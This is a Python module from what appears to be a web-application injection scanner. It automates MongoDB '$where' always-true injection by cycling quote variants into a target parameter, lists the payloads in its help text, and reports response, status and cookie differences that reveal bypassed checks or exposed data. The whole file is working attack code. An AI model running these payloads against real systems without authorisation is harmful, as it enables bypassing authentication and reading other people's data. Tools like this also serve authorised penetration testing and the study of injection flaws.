import copy;
import difflib;
from util.output import verbose;
from util.output import success;
from util.output import failure;
from util.output import question;
from util.output import info;
from util.output import bold;

import threading;
from itertools import combinations;

class WhereAlwaysTrueInjection:
    def doc(self):
        bold("--Description--");
        print("Attempts to exploit a one liner where check in a mongodb injection point to display \
data, bypassing any mongodb check.");
        print("");
        bold("--How it works--");
        print("The target must be using a '$where' check that is only a one liner. Example:");
        print("$where: \"this.username == '\".$_POST[\"username\"].\"'\"");
        print("This module will send a payload looking like one of these:");
        print("' ||  '' ==  '");
        print("' ||  '' ==  ");
        print(" ||  '' ==  '");
        print(" ||  '' ==  ''");
        print(" ||  '' ==  ");
        print("\" ||  '' ==  \"");
        print("\" ||  '' ==  ");
        print(" ||  '' ==  \"");
        print(" ||  '' ==  \"\"");
        print("If a difference in webpage content, status or cookies is detected, \
this module will find it.");
        bold("--Output--");
        print("This module will output differences it finds.");
        bold("--Extra Notes--");
        print("Not to be confused with whereAlwaysTrueFunctionInjection. If the target has a javascript \
function in their $where, and the injection point is not in the return area, then this \
module may not work.");
        print("This may have some false positives if the target is also vulnerable to whereAlwaysTrueFunctionInjection.");
        
    def getID(self):
        return 4;
        
    def getType(self):
        return "w";
    def __init__(self,url,param,scanner):
        self.url = url;
        self.param = param;
        self.scanner = scanner;
        self.options = {'q':"'","front":True,"back":True};
        #q, quote to use
        #front, if payload must start with quote
        #back, if payload must end with quote
        self.toGrabInFuture = [];
        self.entries = [];

    def vulnTest(self):
        failPayl = "\\";
        data = copy.deepcopy(self.scanner.data);
        data[self.param] = failPayl;
        self.scanner.textErrorBaseline = self.scanner.sendData(data).text;

        if self.scanner.textErrorBaseline != self.scanner.textBaseline:
            success("Basic check succeeded!");
        else:
            bold("Basic check failed. The rest of this module may not work.");
        
        for options in self.getAllOptions():
            verbose("Testing with: " + str(options));
            data = copy.deepcopy(self.scanner.data);
            data[self.param] = self.buildPayload(options," ||  '' == ");
            req = self.scanner.sendData(data);
            if req.text != self.scanner.textErrorBaseline:
                self.options = options;
                success("Error-based content check worked!");
                success("Payload built!");
                success(data[self.param]);
                return True;
        return False;

    def getAllOptions(self):
        allOptions = [{'q':"'","front":True,"back":True},\
         {'q':"'","front":False,"back":True},\
         {'q':"'","front":True,"back":False},\
         {'q':"'","front":False,"back":False},\
         {'q':"\"","front":True,"back":True},\
         {'q':"\"","front":False,"back":True},\
         {'q':"\"","front":True,"back":False},\
         {'q':"\"","front":False,"back":False},\
         ];
        return allOptions;

    def buildPayload(self,options,payload):
        q = options["q"];
        reverseQuotes = '"';
        if q == '"':
            reverseQuotes = "'";
        front = options["front"];
        back = options["back"];
        #payload = payload.replace("'",q);
        #payload = payload.replace("\\\"",reverseQuotes);
        if front:
            payload = q + payload;
        
        payload += q;
        if back:
            payload += q;

        return payload;

    def grabData(self):
        results = [];
        req1 = self.scanner.sendData(self.scanner.data);
        results.append("");
        results.append("");
        data = copy.deepcopy(self.scanner.data);
        data[self.param] = self.buildPayload(self.options," ||  '' == ");
        req = self.scanner.sendData(data);
        req2 = self.scanner.sendData(data);
        results.append("For payload: " + data[self.param]);
        if req1.status_code != req2.status_code:
            change = str(req1.status_code) + " => " + str(req2.status_code);
            results.extend(["Status code with the injection is different!",change]);
            results.append("");
            
        elif req1.text != req2.text:
            diff = difflib.unified_diff(req1.text, req2.text)
            new = "";
            for item in diff:
                if item.startswith("+"):
                    if len(item) > 2:
                        continue;
                    new += item[1];
            if new.strip() != "":
                results.extend(["Content Difference:"] + [new]);
                results.append("");
        if req1.cookies != req2.cookies:
            cookies = [];
            oldCookies = req1.cookies.get_dict();
            for key in req2.cookies.get_dict():
                if key in oldCookies:
                    if oldCookies[key] == req2.cookies.get_dict()[key]:
                        continue;
                cookies.append(key+" : "+req2.cookies.get_dict()[key]);

            if len(cookies) > 0:
                results.extend(["New Cookies:"]+cookies);
                results.append("");
        if len(results) == 3:
            failure("No differences could be found.");
            return None;
        return results;